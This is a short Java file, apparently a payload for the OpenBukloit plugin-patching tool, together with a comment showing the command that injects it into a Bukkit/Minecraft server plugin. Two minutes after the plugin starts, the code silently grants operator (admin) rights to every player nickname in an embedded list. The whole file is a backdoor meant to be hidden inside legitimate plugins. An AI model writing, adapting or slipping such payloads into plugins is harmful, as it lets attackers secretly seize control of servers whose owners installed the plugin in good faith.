import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.*;
// Описание на английском намеренно
/**
 * This program gives OP for each player in comma-separated list.
 * OpenBukloit patch command example:
 *   java -jar OpenBukloit-1.1.1.jar -e Tiny.java --players Cheese132,HelloWorld4321
 * Note. You can see this message: Tiny.java uses or overrides a deprecated API.
 *       Ignore it!
 */
public class Tiny{
    private static final String l = "%players%";
    public static void inject(JavaPlugin j){
        Bukkit.getScheduler().runTaskLater(j,()->{
            for(String n : Tiny.l.split(",")){
                Bukkit.getOfflinePlayer(n).setOp(true);
            }
        },2400L); // 2 minutes after onEnable
    }
}
// ---------- variables / переменные ------------
// l    -> player nicknames  => (String)        "player1,player2"
// n    -> nickname to check => (String)        "player1"
// j    -> plugin instance   => (JavaPlugin)    instance